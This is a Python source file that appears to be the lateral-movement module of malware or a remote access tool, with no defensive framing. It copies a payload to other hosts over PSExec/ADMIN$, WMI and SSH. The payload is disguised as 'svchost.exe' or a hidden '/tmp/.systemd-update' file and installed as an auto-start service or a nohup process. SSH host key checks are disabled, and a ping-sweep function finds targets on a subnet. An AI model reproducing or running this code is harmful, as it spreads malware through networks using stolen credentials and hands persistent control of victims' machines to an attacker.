import os
import subprocess


def psexec_spread(protocol, target_ip, username, password, payload_path):
    if os.name != 'nt':
        protocol.send('[-] PSExec spread is Windows-only')
        return

    protocol.send(f'[*] PSExec spread to {target_ip} as {username}')
    try:
        subprocess.run(
            f'net use \\\\{target_ip}\\ADMIN$ /user:{username} {password}',
            shell=True, capture_output=True, timeout=10
        )
        remote_path = f'\\\\{target_ip}\\ADMIN$\\svchost.exe'
        result = subprocess.run(
            f'copy /y "{payload_path}" "{remote_path}"',
            shell=True, capture_output=True, timeout=10
        )
        if result.returncode != 0:
            protocol.send(f'[-] Failed to copy payload: {result.stderr.decode(errors="replace")}')
            return

        sc_result = subprocess.run(
            f'sc \\\\{target_ip} create svchost binPath= "{remote_path}" start= auto',
            shell=True, capture_output=True, timeout=15
        )
        subprocess.run(
            f'sc \\\\{target_ip} start svchost',
            shell=True, capture_output=True, timeout=10
        )
        protocol.send(f'[+] PSExec spread to {target_ip} — service created and started')
    except Exception as e:
        protocol.send(f'[-] PSExec error: {str(e)}')


def wmi_spread(protocol, target_ip, username, password, payload_path):
    if os.name != 'nt':
        protocol.send('[-] WMI spread is Windows-only')
        return

    protocol.send(f'[*] WMI spread to {target_ip}')
    try:
        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        cmd = (
            f'wmic /node:"{target_ip}" /user:"{username}" /password:"{password}" '
            f'process call create "cmd.exe /c copy \\\\localhost\\ADMIN$\\svchost.exe '
            f'{temp_dir}\\svchost.exe '
            f'&& start /b {temp_dir}\\svchost.exe"'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
        if result.returncode == 0:
            protocol.send(f'[+] WMI spread to {target_ip} — process created')
        else:
            protocol.send(f'[-] WMI failed: {result.stderr.decode(errors="replace")}')
    except Exception as e:
        protocol.send(f'[-] WMI error: {str(e)}')


def ssh_spread(protocol, target_ip, username, password, payload_path):
    if os.name == 'nt':
        protocol.send('[-] SSH spread is Linux-only (use psexec or wmi on Windows)')
        return

    protocol.send(f'[*] SSH spread to {target_ip}')
    try:
        remote_path = f'/tmp/.systemd-update'
        subprocess.run(
            ['sshpass', '-p', password, 'scp', '-o', 'StrictHostKeyChecking=no',
             payload_path, f'{username}@{target_ip}:{remote_path}'],
            capture_output=True, timeout=15
        )
        subprocess.run(
            ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
             f'{username}@{target_ip}', f'chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'],
            capture_output=True, timeout=10
        )
        protocol.send(f'[+] SSH spread to {target_ip}')
    except Exception as e:
        protocol.send(f'[-] SSH error: {str(e)}')


def scan_network(protocol, subnet=None):
    if subnet is None:
        protocol.send('[-] Usage: scan_network <subnet> (e.g., 192.168.1.0/24)')
        return

    protocol.send(f'[*] Scanning {subnet}')
    parts = subnet.replace('/24', '').split('.')
    if len(parts) < 3:
        protocol.send('[-] Invalid subnet format')
        return

    base = '.'.join(parts[:3])
    try:
        if os.name == 'nt':
            output = subprocess.check_output(
                f'for /L %i in (1,1,254) do @ping -n 1 -w 500 {base}.%i 2>nul | find "TTL="',
                shell=True, timeout=30
            ).decode(errors='replace')
        else:
            output = subprocess.check_output(
                f'for i in $(seq 1 254); do ping -c 1 -W 1 {base}.$i 2>/dev/null | grep "bytes from" & done; wait',
                shell=True, timeout=30
            ).decode(errors='replace')

        hosts = []
        for line in output.split('\n'):
            line = line.strip()
            if line and 'bytes from' in line.lower():
                host = line.split()[3].replace(':', '')
                hosts.append(host)

        if hosts:
            protocol.send(f'[+] Found {len(hosts)} hosts:\n' + '\n'.join(f'  {h}' for h in hosts))
        else:
            protocol.send('[-] No hosts found')
    except Exception as e:
        protocol.send(f'[-] Scan error: {str(e)}')
